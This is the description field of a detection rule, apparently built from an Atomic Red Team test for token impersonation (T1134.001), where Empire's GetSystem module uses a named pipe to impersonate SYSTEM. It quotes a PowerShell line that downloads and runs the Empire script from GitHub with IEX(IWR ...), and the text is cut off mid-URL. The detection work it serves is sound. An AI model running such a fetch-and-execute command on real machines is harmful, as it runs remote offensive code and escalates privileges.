description = "Detection for specific test 'Named pipe client impersonation' (GUID: 90db9e27-8e7c-4c04-b602-a45927884966) of technique T1134.001 (Access Token Manipulation: Token Impersonation/Theft). Test Description: Uses PowerShell and Empire's [GetSystem module](https://github.com/BC-SECURITY/Empire/blob/v3.4.0/data/module_source/privesc/Get-System.ps1). The script creates a named pipe, and a service that writes to that named pipe. When the service connects to the named pipe, the script impersonates its security context.\nWhen executed successfully, the test displays the domain and name of the account it's impersonating (local SYSTEM).\n\nReference: https://blog.cobaltstrike.com/2014/04/02/what-happens-when-i-type-getsystem/. Command/Steps: [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a..."
